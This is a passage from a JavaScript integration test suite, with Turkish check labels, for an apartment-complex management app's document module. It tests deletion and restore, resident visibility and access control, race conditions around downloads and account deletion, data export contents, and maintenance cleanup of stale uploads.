  const delSoft = await call('DELETE', base1(`/${life.id}`), MGR, {});
  const listDeleted = await call('GET', base1('?status=deleted'), MGR);
  const itemDeleted = listDeleted.body.items.find((i) => i.id === life.id);
  check('F1: yumusak silme: status deleted, deleted_at dolu, days_until_purge 30; aktif listede yok, silinenlerde var; dosya durur', delSoft.status === 200 && itemDeleted && itemDeleted.status === 'deleted' && itemDeleted.days_until_purge === 30 && !(await call('GET', base1(), MGR)).body.items.some((i) => i.id === life.id) && (await diskFiles()).includes(lifeKey.split('/')[1]), itemDeleted);
  check('F2: silinmis belgeyi yonetici indirebilir; kurul 404 (kurul silinenleri goremez)', (await call('GET', base1(`/${life.id}/download`), MGR)).status === 200 && (await call('GET', base1(`/${life.id}`), BOARD)).status === 404);
  const restored = await call('POST', base1(`/${life.id}/restore`), MGR);
  check('F3: geri alma: status active, deleted_at NULL; ikinci geri alma 409 INVALID_STATE', restored.status === 200 && restored.body.document.status === 'active' && restored.body.document.deleted_at === null && (await call('POST', base1(`/${life.id}/restore`), MGR)).status === 409);
  await call('DELETE', base1(`/${life.id}`), MGR, {});
  await q(`UPDATE documents SET deleted_at = NOW() - INTERVAL '31 days' WHERE id = $1`, [life.id]);
  const expiredRestore = await call('POST', base1(`/${life.id}/restore`), MGR);
  check('F4: saklama suresi (30 gun) dolmus belge geri alinamaz: 404 DOCUMENT_NOT_FOUND', expiredRestore.status === 404 && expiredRestore.body.code === 'DOCUMENT_NOT_FOUND', expiredRestore.body);
  const purgeNoConfirm = await call('POST', base1(`/${life.id}/purge`), MGR, {});
  const purgeActive = await call('POST', base1(`/${first.id ?? 0}/purge`), MGR, { confirm: true });
  const purgeOk = await call('POST', base1(`/${life.id}/purge`), MGR, { confirm: true });
  check('F5: kalici silme onay ister (400 CONFIRM_REQUIRED); yalniz deleted belge (aktif 409); basarida dosya + satir gider ve audit document.purged', purgeNoConfirm.status === 400 && purgeNoConfirm.body.code === 'CONFIRM_REQUIRED' && purgeActive.status === 409 && purgeOk.status === 200 && !(await diskFiles()).includes(lifeKey.split('/')[1]) && (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE id = $1`, [life.id])) === 0 && (await countOf(`SELECT COUNT(*)::int AS n FROM audit_log WHERE action = 'document.purged' AND target_id = $1`, [String(life.id)])) === 1);
  // PATCH
  const patchDoc = await publish(MGR, { audience: 'residents', title: 'Duzenlenecek', description: 'eski' });
  const patched = await call('PATCH', base1(`/${patchDoc.id}`), MGR, { title: 'Yeni baslik', category: 'minutes', audience: 'board' });
  check('F6: PATCH: baslik / kategori / kitle degisir; kitle residents disina gecince hedef site + bos dizi; audit yalniz alan adlari', patched.status === 200 && patched.body.document.title === 'Yeni baslik' && patched.body.document.category === 'minutes' && patched.body.document.audience === 'board' && patched.body.document.target.type === 'site' && !JSON.stringify((await q(`SELECT details FROM audit_log WHERE action = 'document.updated' AND target_id = $1`, [String(patchDoc.id)])).rows).includes('Yeni baslik'), patched.body);
  const badPatch = [
    await call('PATCH', base1(`/${patchDoc.id}`), MGR, {}),
    await call('PATCH', base1(`/${patchDoc.id}`), MGR, { audience: 'board', target: { type: 'blocks', block_ids: [site.blockIds['A Blok']] } }),
    await call('PATCH', base1(`/${patchDoc.id}`), MGR, { audience: 'residents', target: { type: 'blocks', block_ids: [schemaSite.apts[0].blockId] } }),
    await call('PATCH', base1(`/99999999`), MGR, { title: 'x' }),
  ];
  check('F7: PATCH hatalari: bos govde 400; kurul belgesine blok hedefi 400 INVALID_TARGET; baska sitenin blogu 400 INVALID_TARGET; olmayan belge 404', badPatch[0].status === 400 && badPatch[1].body.code === 'INVALID_TARGET' && badPatch[2].body.code === 'INVALID_TARGET' && badPatch[3].status === 404, badPatch.map((r) => r.body?.code));
  const cancelDoc = await call('POST', base1(), MGR, newDoc({}, PDF));
  const cancelKey = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1`, [cancelDoc.body.document.id])).rows[0].storage_key;
  const cancelled = await call('DELETE', base1(`/${cancelDoc.body.document.id}`), MGR, {});
  check('F8: yuklemesi tamamlanmamis (pending) belge DELETE ile IPTAL edilir: satirlar kalkar (kota rezervasyonu duser)', cancelled.status === 200 && cancelled.body.cancelled === true && (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE id = $1`, [cancelDoc.body.document.id])) === 0 && !(await diskFiles()).includes(cancelKey.split('/')[1]));

  // ============================================================================================================
  // G. Sakin gorunurlugu (CANLI)
  // ============================================================================================================
  console.log('--- G. sakin gorunurlugu ---');
  await expirePending();
  const vis = await mkSite('Gorunurluk Sitesi', { 'A Blok': 2, 'B Blok': 2 });
  await linkManager(vis.code, MGR);
  await enableModule(vis.code);
  const vBase = (suffix = '') => `/manager/sites/${vis.code}/documents${suffix}`;
  const A1 = vis.apt('A Blok - Daire 1');
  const A2 = vis.apt('A Blok - Daire 2');
  const B1 = vis.apt('B Blok - Daire 1');
  const R1 = await resident(vis, A1, 'Sakin A1');
  const R2 = await resident(vis, B1, 'Sakin B1');
  const R3user = await mkUser('Dairesiz Hesap', 'apartment_owner');
  await addPerson(vis.code, R3user);
  const R5user = await mkUser('Pasif Kisi', 'apartment_owner');
  const R5person = await addPerson(vis.code, R5user, { active: false });
  await addResidency(vis.code, A1.id, R5person);
  const VB = await mkUser('Kurul Sakin', 'individual');
  await addMember(vis.code, VB, 'BOARD_MEMBER');
  const vdoc = async (over, bytes = PDF) => {
    const r = await publish(MGR, over, bytes, vis.code);
    return r.id;
  };
  const dSite = await vdoc({ audience: 'residents', title: 'Tum Site', category: 'notice' });
  const dBlockA = await vdoc({ audience: 'residents', title: 'Yalniz A Blok', target: { type: 'blocks', block_ids: [vis.blockIds['A Blok']] } });
  const dAptB1 = await vdoc({ audience: 'residents', title: 'Yalniz B1', target: { type: 'apartments', apartment_ids: [B1.id] } });
  const dBoard = await vdoc({ audience: 'board', title: 'Kurul Belgesi' });
  const dManagers = await vdoc({ audience: 'managers', title: 'Yonetici Belgesi' });
  const listIds = async (user, query = '') => (await call('GET', `/app/documents${query}`, user)).body.items.map((i) => i.id).sort((a, b) => a - b);
  const sorted = (...ids) => [...ids].sort((a, b) => a - b);
  check('G1: sakin A1: tum site + A blok belgesi; B1 hedefli, kurul ve yonetici belgesi GORUNMEZ', same(await listIds(R1.user), sorted(dSite, dBlockA)), await listIds(R1.user));
  check('G2: sakin B1: tum site + KENDI daire hedefli belge; A blok belgesi gorunmez', same(await listIds(R2.user), sorted(dSite, dAptB1)), await listIds(R2.user));
  check('G3: dairesiz hesap, pasif kisi, kurul-disi ilgisiz, yonetici (sakin ucunda) HICBIR belge gormez', same(await listIds(R3user), []) && same(await listIds(R5user), []) && same(await listIds(OUTSIDER), []) && same(await listIds(MGR), []));
  check('G4: kurul uyesi (BOARD_MEMBER) sitesinin sakinlere acik belgelerini hedef ne olursa olsun gorur; kurul / yonetici belgesi /app uclarinda yok', same(await listIds(VB), sorted(dSite, dBlockA, dAptB1)), await listIds(VB));
  const detailR1 = await call('GET', `/app/documents/${dBlockA}`, R1.user);
  check('G5: sakin ayrintisi { id, site_code, site_name, title, category, description, file_name, mime_type, size_bytes, version_no, is_updated, updated_at }; gorunmeyen belge 404 DOCUMENT_NOT_FOUND', detailR1.status === 200 && same(Object.keys(detailR1.body), ['id', 'site_code', 'site_name', 'title', 'category', 'description', 'file_name', 'mime_type', 'size_bytes', 'version_no', 'is_updated', 'updated_at']) && detailR1.body.is_updated === false && (await call('GET', `/app/documents/${dAptB1}`, R1.user)).body.code === 'DOCUMENT_NOT_FOUND' && (await call('GET', `/app/documents/${dManagers}`, R1.user)).status === 404 && (await call('GET', `/app/documents/${dBoard}`, R1.user)).status === 404, detailR1.body);
  const dlR1 = await call('GET', `/app/documents/${dBlockA}/download`, R1.user);
  const dlR1Denied = await call('GET', `/app/documents/${dAptB1}/download`, R1.user);
  check('G6: sakin indirme: yetkiliye 200 + attachment / nosniff / no-store; hedefte olmayana 404 (varlik sizmaz)', dlR1.status === 200 && Buffer.compare(dlR1.raw, PDF) === 0 && dlR1.headers.get('cache-control') === 'private, no-store' && dlR1Denied.status === 404);
  for (let i = 0; i < 100 && (await countOf(`SELECT download_count::int AS n FROM documents WHERE id = $1`, [dBlockA])) < 1; i += 1) await sleep(20);
  check('G7: sakin indirmesi download_count artirir; yonetici indirmesi saymaz', (await countOf(`SELECT download_count::int AS n FROM documents WHERE id = $1`, [dBlockA])) === 1 && (await call('GET', vBase(`/${dBlockA}/download`), MGR)).status === 200 && (await countOf(`SELECT download_count::int AS n FROM documents WHERE id = $1`, [dBlockA])) === 1);
  // tasinma
  await q(`UPDATE apartment_residencies SET is_current = FALSE, move_out_date = CURRENT_DATE WHERE person_id = $1 AND is_current`, [R1.person]);
  check('G8: TASINAN sakin erisimi ANINDA kaybeder (liste bos, ayrinti 404, indirme 404)', same(await listIds(R1.user), []) && (await call('GET', `/app/documents/${dSite}`, R1.user)).status === 404 && (await call('GET', `/app/documents/${dSite}/download`, R1.user)).status === 404);
  await addResidency(vis.code, A2.id, R1.person);
  check('G9: YENI TASINAN sakin ANINDA gorur (A blok 2. daire): tum site + A blok', same(await listIds(R1.user), sorted(dSite, dBlockA)), await listIds(R1.user));
  await q(`UPDATE site_people SET is_active = FALSE WHERE id = $1`, [R1.person]);
  check('G10: kisi PASIFLESTIRILINCE erisim kaybolur', same(await listIds(R1.user), []));
  await q(`UPDATE site_people SET is_active = TRUE WHERE id = $1`, [R1.person]);
  await q(`UPDATE apartments SET is_active = FALSE WHERE id = $1`, [A2.id]);
  check('G11: pasif daire sakinine belge gostermez', same(await listIds(R1.user), []));
  await q(`UPDATE apartments SET is_active = TRUE WHERE id = $1`, [A2.id]);
  // kitle degisikligi anlik
  await call('PATCH', vBase(`/${dBlockA}`), MGR, { audience: 'residents', target: { type: 'blocks', block_ids: [vis.blockIds['B Blok']] } });
  check('G12: kitle (hedef) degisikligi ANINDA gecerli: A blok -> B blok', same(await listIds(R1.user), sorted(dSite)) && same(await listIds(R2.user), sorted(dSite, dBlockA, dAptB1)));
  // sync: yalniz apartment_memberships olan yeni uye
  const newcomer = await mkUser('Yeni Onayli Uye', 'apartment_owner');
  await q(`INSERT INTO apartment_memberships (apartment_id, user_code, role) VALUES ($1, $2, 'FAMILY_MEMBER')`, [B1.id, newcomer]);
  check('G13: site_people satiri henuz olmayan yeni onayli uye (apartment_memberships) "belge yok" GORMEZ: okuma aninda kisitli esitleme', same(await listIds(newcomer), sorted(dSite, dBlockA, dAptB1)), await listIds(newcomer));
  // sayfalama, kategori, arama
  const manyIds = [];
  for (let i = 0; i < 5; i += 1) manyIds.push(await vdoc({ audience: 'residents', title: `Sayfa Belgesi ${i}`, category: i % 2 === 0 ? 'contract' : 'other' }));
  const page1 = await call('GET', '/app/documents?limit=3', R2.user);
  const page2 = await call('GET', `/app/documents?limit=3&before_id=${page1.body.next_before_id}`, R2.user);
  check('G14: imecli sayfalama (id DESC, before_id): sayfalar birlesince tum belgeler, tekrar yok; son sayfada next_before_id null', page1.body.items.length === 3 && page1.body.next_before_id !== null && page2.body.items.length > 0 && new Set([...page1.body.items, ...page2.body.items].map((i) => i.id)).size === page1.body.items.length + page2.body.items.length && page1.body.items.every((i, idx, arr) => idx === 0 || arr[idx - 1].id > i.id));
  const byCategory = await call('GET', '/app/documents?category=contract', R2.user);
  const bySearch = await call('GET', '/app/documents?q=SAYFA%20BELGESI%203', R2.user);
  check('G15: kategori suzgeci ve Turkce-duyarsiz arama (buyuk / kucuk harf)', byCategory.body.items.length === 3 && byCategory.body.items.every((i) => i.category === 'contract') && bySearch.body.items.length === 1 && bySearch.body.items[0].title === 'Sayfa Belgesi 3');
  const badQuery = await call('GET', '/app/documents?category=yok', R2.user);
  check('G16: gecersiz sorgu 400 INVALID_QUERY', badQuery.status === 400 && badQuery.body.code === 'INVALID_QUERY');
  // modul kapali / site onaysiz / silinmis / pending
  await q(`UPDATE site_modules SET enabled = FALSE WHERE site_code = $1 AND module_code = 'documents'`, [vis.code]);
  check('G17: modul KAPALI: sakin listesi bos, ayrinti ve indirme 404; belgeler SILINMEZ', same(await listIds(R2.user), []) && (await call('GET', `/app/documents/${dSite}`, R2.user)).status === 404 && (await call('GET', `/app/documents/${dSite}/download`, R2.user)).status === 404 && (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE site_code = $1 AND status = 'active'`, [vis.code])) >= 5 && (await call('GET', vBase(), MGR)).body.code === 'MODULE_DISABLED');
  await q(`UPDATE site_modules SET enabled = TRUE WHERE site_code = $1 AND module_code = 'documents'`, [vis.code]);
  check('G17b: modul yeniden acilinca her sey geri gelir', (await listIds(R2.user)).includes(dSite));
  await q(`UPDATE sites SET approval_status = 'pending' WHERE site_code = $1`, [vis.code]);
  check('G18: onaysiz site belgeleri sakine gostermez', same(await listIds(R2.user), []));
  await q(`UPDATE sites SET approval_status = 'approved' WHERE site_code = $1`, [vis.code]);
  await call('DELETE', vBase(`/${dSite}`), MGR, {});
  const pendingResident = await call('POST', vBase(), MGR, newDoc({ audience: 'residents' }, PDF));
  check('G19: yumusak silinen ve yuklemesi bitmemis (pending) belge sakine gorunmez / indirilemez', !(await listIds(R2.user)).includes(dSite) && (await call('GET', `/app/documents/${dSite}/download`, R2.user)).status === 404 && (await call('GET', `/app/documents/${pendingResident.body.document.id}/download`, R2.user)).status === 404);
  const otherSiteDoc = await publish(MGR2, { audience: 'residents' }, PDF, site2.code);
  check('G20: IDOR: baska sitenin belgesi (sakin ve yonetici ucundan) 404; baska sitenin yoneticisi bu sitenin belgesine 403', (await call('GET', `/app/documents/${otherSiteDoc.id}`, R2.user)).status === 404 && (await call('GET', vBase(`/${otherSiteDoc.id}`), MGR)).status === 404 && (await call('GET', vBase(`/${dBoard}`), MGR2)).status === 403);
  // kurul gorunurlugu (yonetici ucu)
  const boardList = await call('GET', vBase(), BOARD);
  check('G21: kurul (yonetici ucu): yalnız board + residents belgeleri; managers belgesi YOK; yukleyen adi / olusturan anahtari YOK', (await call('GET', vBase(), VB)).body.items.every((i) => i.audience !== 'managers' && !('uploaded_by_name' in i)) && (await call('GET', vBase(`/${dManagers}`), VB)).status === 404 && (await call('GET', vBase(`/${dBoard}/download`), VB)).status === 200 && (await call('GET', vBase(`/${dManagers}/download`), VB)).status === 404 && boardList.status === 403);
  const managerList = await call('GET', vBase(), MGR);
  check('G22: yonetici listesi uploaded_by_name icerir; kurul detayinda surum yukleyen adi yok', managerList.body.items.every((i) => 'uploaded_by_name' in i) && !JSON.stringify((await call('GET', vBase(`/${dBoard}`), VB)).body).includes('uploaded_by_name'));

  // ============================================================================================================
  // H. Silme x indirme ve hesap silme x yukleme yarislari
  // ============================================================================================================
  console.log('--- H. yarislar ---');
  await expirePending();
  const raceBytes = makePdf({ padding: 3_000_000 });
  const raceDl = await publish(MGR, { audience: 'residents', title: 'Yaris Belgesi', file: { name: 'yaris.pdf', size: raceBytes.length } }, raceBytes, vis.code);
  const dlStatuses = [];
  const bodiesOk = [];
  const downloaders = Array.from({ length: 60 }, async (_, i) => {
    await sleep(i * 9);
    const r = await call('GET', `/app/documents/${raceDl.id}/download`, R2.user);
    dlStatuses.push(r.status);
    if (r.status === 200) bodiesOk.push(Buffer.compare(r.raw, raceBytes) === 0);
  });
  const killer = (async () => {
    await sleep(200);
    await call('DELETE', vBase(`/${raceDl.id}`), MGR, {});
    await call('POST', vBase(`/${raceDl.id}/purge`), MGR, { confirm: true });
  })();
  await Promise.all([...downloaders, killer]);
  check(`H1: SILME x INDIRME yarisi (60 indirme + kalici silme): her yanit 200 (tam, bozuk degil), 404 ya da esik asilinca 503 DOWNLOAD_BUSY; 500 / yarim govde YOK (${JSON.stringify(dlStatuses.reduce((a, s) => ({ ...a, [s]: (a[s] ?? 0) + 1 }), {}))})`, dlStatuses.every((s) => s === 200 || s === 404 || s === 503) && bodiesOk.every(Boolean) && dlStatuses.includes(404) && dlStatuses.includes(200), dlStatuses);

  // hesap silme x yukleme
  const doomed = await mkUser('Silinecek Yonetici', 'site_manager');
  const raceSite = await mkSite('Hesap Yaris Sitesi', { 'A Blok': 1 });
  await linkManager(raceSite.code, doomed);
  await linkManager(raceSite.code, MGR);
  await enableModule(raceSite.code);
  const results = [];
  let succeeded = 0;
  let deletionFinishedAt = null;
  const lateStarts = [];
  const uploadLoop = async (worker) => {
    for (let i = 0; i < 8; i += 1) {
      const startedAt = Date.now();
      const r = await call('POST', `/manager/sites/${raceSite.code}/documents`, doomed, newDoc({ title: `Yaris ${worker}-${i}` }, PDF));
      results.push([r.status, r.body?.code]);
      if (deletionFinishedAt !== null && startedAt > deletionFinishedAt) lateStarts.push([r.status, r.body?.code]);
      if (r.status === 201) {
        const put = await rawPut(r.body.upload.path, doomed, PDF);
        results.push([put.status, put.body?.code]);
        if (put.status === 200) succeeded += 1;
      }
    }
  };
  const deletion = (async () => {
    for (let i = 0; i < 200 && succeeded < 3; i += 1) await sleep(10);
    await performAccountDeletion(doomed);
    deletionFinishedAt = Date.now();
  })();
  await Promise.all([uploadLoop(1), uploadLoop(2), uploadLoop(3), deletion]);
  const tomb = (await q(`SELECT deleted_at, full_name FROM users WHERE user_code = $1`, [doomed])).rows[0];
  const created201 = results.filter(([s], idx, all) => s === 201 && all[idx] !== undefined).length;
  const rowsOfDoomed = await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE created_by = $1`, [doomed]);
  const statusSet = [...new Set(results.map(([s]) => s))].sort();
  check(`H2: HESAP SILME x YUKLEME (3 isci x 8 belge, ortada silme): satir sayisi = 201 sayisi (${rowsOfDoomed} = ${created201}; hayalet satir yok), yalniz {200, 201, 401, 403} yanitlari (${statusSet.join(',')}), silmeden SONRA baslayan her istek reddedildi (${lateStarts.length})`, tomb.deleted_at !== null && rowsOfDoomed === created201 && succeeded >= 3 && results.every(([s]) => [200, 201, 401, 403].includes(s)) && lateStarts.every(([s]) => s === 401), { results: results.slice(-6), lateStarts: lateStarts.slice(0, 3) });
  // belirleyici: silinmis hesap servis katmaninda da yazamaz (authRequired atlansa bile)
  const documentService = await import('../src/modules/document_service.js');
  const ghostActor = { user_code: doomed, userCode: doomed, id: doomed, role: 'site_manager', full_name: 'Silinmiş Kullanıcı' };
  const ghostError = await documentService.createDocument({ siteCode: raceSite.code, actor: ghostActor, body: newDoc({}, PDF), limits: (await import('../src/modules/document_common.js')).documentLimits() }).then(() => null, (error) => error);
  check('H2b: SILINMIS hesap servis katmaninda da belge olusturamaz: 401 ACCOUNT_DELETED (users FOR KEY SHARE + deleted_at IS NULL)', ghostError && ghostError.code === 'ACCOUNT_DELETED' && ghostError.statusCode === 401, ghostError?.code);
  // belirleyici: tamamlanmak uzere olan yukleme x hesap silme
  const late = await mkUser('Gec Kalan Yonetici', 'site_manager');
  await linkManager(raceSite.code, late);
  const lateCreated = await call('POST', `/manager/sites/${raceSite.code}/documents`, late, newDoc({}, PDF));
  const lateTarget = await documentService.findUploadTarget({ siteCode: raceSite.code, rawId: String(lateCreated.body.document.id), rawVersionNo: '1', actor: { user_code: late, userCode: late, id: late, role: 'site_manager' }, limits: (await import('../src/modules/document_common.js')).documentLimits() });
  await performAccountDeletion(late);
  const lateComplete = await documentService
    .completeUpload({ siteCode: raceSite.code, target: lateTarget, actor: { user_code: late, userCode: late, id: late, role: 'site_manager' }, size: PDF.length, sha256: 'a'.repeat(64), kind: 'pdf', limits: (await import('../src/modules/document_common.js')).documentLimits() })
    .then(() => null, (error) => error);
  const lateVersion = (await q(`SELECT status FROM document_versions WHERE document_id = $1`, [lateCreated.body.document.id])).rows[0];
  check('H2c: yukleme TAMAMLANIRKEN hesap silinmisse tamamlama reddedilir (401 ACCOUNT_DELETED), surum ready OLMAZ', lateComplete?.code === 'ACCOUNT_DELETED' && lateVersion.status === 'uploading', { code: lateComplete?.code, status: lateVersion.status });
  // belirleyici: belge yazan islem users satirini tutarken hesap silme BEKLER (FOR KEY SHARE)
  const holder = await mkUser('Kilit Tutan Yonetici', 'site_manager');
  const holderClient = await pool.connect();
  await holderClient.query('BEGIN');
  await holderClient.query(`SELECT user_code FROM users WHERE user_code = $1 AND deleted_at IS NULL FOR KEY SHARE`, [holder]);
  let holderDeleted = false;
  const holderDeletion = performAccountDeletion(holder).then(() => { holderDeleted = true; });
  await sleep(600);
  const waitedWhileHeld = holderDeleted === false;
  await holderClient.query('COMMIT');
  holderClient.release();
  await holderDeletion;
  check('H2d: belge yazan islem users satirini (FOR KEY SHARE) tutarken hesap silme BEKLER; islem bitince tamamlanir', waitedWhileHeld && holderDeleted === true);
  const doomedDocs = await call('GET', `/manager/sites/${raceSite.code}/documents`, MGR);
  check('H3: silinen hesabin yukledigi belgeler KALIR (belge siteye aittir); yukleyen adi "Silinmiş Kullanıcı" gorunur', doomedDocs.body.items.length > 0 && doomedDocs.body.items.every((i) => i.uploaded_by_name === 'Silinmiş Kullanıcı') && tomb.full_name === 'Silinmiş Kullanıcı', doomedDocs.body.items.slice(0, 2));
  const exportData = await collectPersonalData(doomed);
  // R10 (S-A): disa aktarma yuklenen belgelerin KAYIT bilgisini (baslik, dosya adi, boyut, tarih) KAPSAR; dosya icerigi, depolama anahtari, icerik ozeti, kitle / hedef YOK
  const exportedDocs = exportData.data.uploaded_documents ?? [];
  const exportText = JSON.stringify(exportData);
  const doomedKeys = (await q(`SELECT storage_key FROM document_versions WHERE uploaded_by = $1`, [doomed])).rows.map((r) => r.storage_key);
  check('H4: veri disa aktarma yuklenen belgelerin KAYIT bilgisini kapsar (baslik / dosya adi / boyut / tarih); depolama anahtari, icerik ozeti, kitle YOK; excluded aciklamasi belge iceriklerini anar',
    exportedDocs.length > 0 && exportedDocs.every((d) => typeof d.file_name === 'string' && typeof d.recorded_at !== 'undefined' && !('title' in d) && !('storage_key' in d) && !('sha256' in d) && !('audience' in d))
      && !/Yaris \d+-\d+/.test(exportText) && doomedKeys.length > 0 && doomedKeys.every((key) => !exportText.includes(key)) && !/"sha256"|"storage_key"/.test(exportText) && EXPORT_EXCLUDED.some((line) => /belge/.test(line) && /uploaded_documents/.test(line)), { exported: exportedDocs.length, keys: doomedKeys.length });

  // ============================================================================================================
  // I. Bakim isi
  // ============================================================================================================
  console.log('--- I. bakim ---');
  const maint = await mkSite('Bakim Sitesi', { 'A Blok': 1 });
  await linkManager(maint.code, MGR);
  await enableModule(maint.code);
  const mBase = `/manager/sites/${maint.code}/documents`;
  const staleDoc = await call('POST', mBase, MGR, newDoc({}, PDF));
  const staleKey = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1`, [staleDoc.body.document.id])).rows[0].storage_key;
  await fsp.mkdir(path.join(storageRoot, 'sites', String(maint.code)), { recursive: true });
  await fsp.writeFile(pathForKey(storageRoot, staleKey), PDF); // PUT yarida kalmis, son dosya olusmus senaryosu
  const youngDoc = await call('POST', mBase, MGR, newDoc({}, PDF));
  await q(`UPDATE document_versions SET created_at = NOW() - INTERVAL '3 hours' WHERE document_id = $1`, [staleDoc.body.document.id]);
  await q(`UPDATE documents SET created_at = NOW() - INTERVAL '3 hours' WHERE id = $1`, [staleDoc.body.document.id]);
  // zaten aktif belgede bayat yenileme (replace) sürümü
  const activeDoc = await publish(MGR, {}, PDF, maint.code);
  const replaceBytes = makePdf({ padding: 77 });
  const staleReplace = await call('POST', `${mBase}/${activeDoc.id}/versions`, MGR, { file: { name: 'yeni.pdf', size: replaceBytes.length } });
  await q(`UPDATE document_versions SET created_at = NOW() - INTERVAL '3 hours' WHERE document_id = $1 AND status = 'uploading'`, [activeDoc.id]);
  // _tmp kalintisi
  const oldTmp = path.join(storageRoot, '_tmp', `${crypto.randomUUID()}.part`);
  const newTmp = path.join(storageRoot, '_tmp', `${crypto.randomUUID()}.part`);
  await fsp.writeFile(oldTmp, 'x');
  await fsp.writeFile(newTmp, 'x');
  await fsp.utimes(oldTmp, new Date(Date.now() - 3 * 3600_000), new Date(Date.now() - 3 * 3600_000));
  const m1 = await runDocumentsMaintenanceOnce();
  check('I1: bayat yuklemeler (2 saat+) dosyalariyla silinir; genc olan korunur; bayat pending belge kalkar; aktif belgenin bayat yenileme surumu silinir; _tmp eski kalinti silinir, yeni korunur',
    (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE id = $1`, [staleDoc.body.document.id])) === 0 &&
      !(await diskFiles(maint.code)).includes(staleKey.split('/')[1]) &&
      (await countOf(`SELECT COUNT(*)::int AS n FROM documents WHERE id = $1`, [youngDoc.body.document.id])) === 1 &&
      (await countOf(`SELECT COUNT(*)::int AS n FROM document_versions WHERE document_id = $1 AND status = 'uploading'`, [activeDoc.id])) === 0 &&
      (await call('GET', `${mBase}/${activeDoc.id}`, MGR)).body.status === 'active' &&
      !fsSync.existsSync(oldTmp) && fsSync.existsSync(newTmp) && m1.summary.stale_uploads >= 2 && staleReplace.status === 201, { m1, status: staleReplace.status });
  const identityRow = (await q(`SELECT value FROM platform_settings WHERE key = 'documents.storage_id'`)).rows[0];
  const identityFileText = (await fsp.readFile(path.join(storageRoot, '.instance'), 'utf8')).trim();
  check('I1b (R9 F4): ilk bakim turu depolama kimligini HEM dizine (.instance) HEM veritabanina (platform_settings) yazar; ikisi esittir; engellenmez', identityRow?.value?.id === identityFileText && /^[0-9a-f-]{36}$/.test(identityFileText) && m1.summary.identity_blocked === 0, { blocked: m1.summary.identity_blocked });

  // --- R16 P1-1: yukleme suresi SUNUCUDA uygulanir; bakim ONCE satir, SONRA dosya
  await expirePending();
  const ttlCreated = await call('POST', mBase, MGR, newDoc({}, PDF));
  await q(`UPDATE document_versions SET created_at = NOW() - INTERVAL '3 hours' WHERE document_id = $1`, [ttlCreated.body.document.id]);
  const tmpBeforeTtl = await tmpFiles(); // I1'in genc _tmp kalintisi (korunan) burada beklenen
  const ttlPut = await rawPut(ttlCreated.body.upload.path, MGR, PDF);
  const ttlKey = (await q(`SELECT storage_key FROM document_versions WHERE document_id = $1`, [ttlCreated.body.document.id])).rows[0].storage_key;
  check('I1c (R16 P1-1): suresi (2 saat) dolmus uploading surume PUT 410 UPLOAD_EXPIRED; dosya / tmp kalmaz, surum ready olmaz',
    ttlPut.status === 410 && ttlPut.body.code === 'UPLOAD_EXPIRED' && same(await tmpFiles(), tmpBeforeTtl) && !fsSync.existsSync(pathForKey(storageRoot, ttlKey)) && (await countOf(`SELECT COUNT(*)::int AS n FROM document_versions WHERE document_id = $1 AND status = 'ready'`, [ttlCreated.body.document.id])) === 0, ttlPut.body);

  // belirleyici ara giris: bakimin bayat SELECT'i dondukten SONRA, DELETE'ten ONCE `hook` calisir
  const interleave = async (hook) => {
    const originalConnect = pool.connect;
    let armed = true;
    pool.connect = async (...args) => {
      const client = await originalConnect.apply(pool, args);
      if (armed) {
        armed = false; // yalniz bakimin oturum-kilidi baglantisi
        const realQuery = client.query.bind(client);
        client.query = async (...qargs) => {
          const result = await realQuery(...qargs);
          const text = typeof qargs[0] === 'string' ? qargs[0] : '';
          if (/WHERE status = 'uploading' AND created_at < NOW\(\) - make_interval/.test(text)) await hook();
          return result;
        };
      }
      return client;
    };
    try {
      return await runDocumentsMaintenanceOnce();
    } finally {
      pool.connect = originalConnect;
    }
  };

  // I1d: seciminden sonra PUT sureci satiri `ready` yapti (eski kodda bakim ardindan DOSYAYI silerdi -> ready surum dosyasiz, 500 DOCUMENT_FILE_MISSING)
  const r16Bytes = markerPdf('GEC-GELEN-PUT-AAA');
  const r16Created = await call('POST', mBase, MGR, newDoc({}, r16Bytes));
  const r16DocId = r16Created.body.document.id;
  const r16Row = (await q(`SELECT id, storage_key FROM document_versions WHERE document_id = $1`, [r16DocId])).rows[0];
  await q(`UPDATE document_versions SET created_at = NOW() - INTERVAL '3 hours' WHERE id = $1`, [r16Row.id]);
  const r16Maint = await interleave(async () => {
    await fsp.writeFile(pathForKey(storageRoot, r16Row.storage_key), r16Bytes);
    await q(`UPDATE document_versions SET status = 'ready', sha256 = $2, completed_at = NOW() WHERE id = $1`, [r16Row.id, sha256Of(r16Bytes)]);
    await q(`UPDATE documents SET status = 'active', current_version_no = 1, version_count = 1 WHERE id = $1`, [r16DocId]);
  });
  const r16Download = await call('GET', `${mBase}/${r16DocId}/download`, MGR);
  const r16Fsck = await runFsck({ root: storageRoot });
  check('I1d (R16 P1-1): bakimin bayat secimi ile DELETE arasinda surum `ready` olduysa DOSYAYA DOKUNULMAZ (satir ONCE silinir, 0 satir -> dosya silinmez): indirme 200, fsck eksik yok',
    r16Maint.summary.errors === 0 && fsSync.existsSync(pathForKey(storageRoot, r16Row.storage_key)) && r16Download.status === 200 && Buffer.compare(r16Download.raw, r16Bytes) === 0 && !r16Fsck.missing.some((entry) => entry.storage_key === r16Row.storage_key) && (await countOf(`SELECT COUNT(*)::int AS n FROM document_versions WHERE id = $1 AND status = 'ready'`, [r16Row.id])) === 1,
    { r16Maint: r16Maint.summary, download: r16Download.status, missing: r16Fsck.missing });

  // I1e: seciminden sonra bekleyen surum YENILENDI (created_at = NOW, yeni anahtar): sure kosulu DELETE'te tekrar sinanir -> yenilenen satir ve yeni yukleme tanimi KORUNUR
  const renewDoc = await publish(MGR, {}, PDF, maint.code);
  const renewBytes = markerPdf('YENILENEN-YUK-BBB');
  const renewFirst = await call('POST', `${mBase}/${renewDoc.id}/versions`, MGR, { file: { name: 'v2.pdf', size: renewBytes.length } });
  const renewRowId = (await q(`SELECT id FROM document_versions WHERE document_id = $1 AND status = 'uploading'`, [renewDoc.id])).rows[0].id;
  await q(`UPDATE document_versions SET created_at = NOW() - INTERVAL '3 hours' WHERE id = $1`, [renewRowId]);
  let renewed = null;
  const renewMaint = await interleave(async () => {
    renewed = await call('POST', `${mBase}/${renewDoc.id}/versions`, MGR, { file: { name: 'v2.pdf', size: renewBytes.length } });
  });
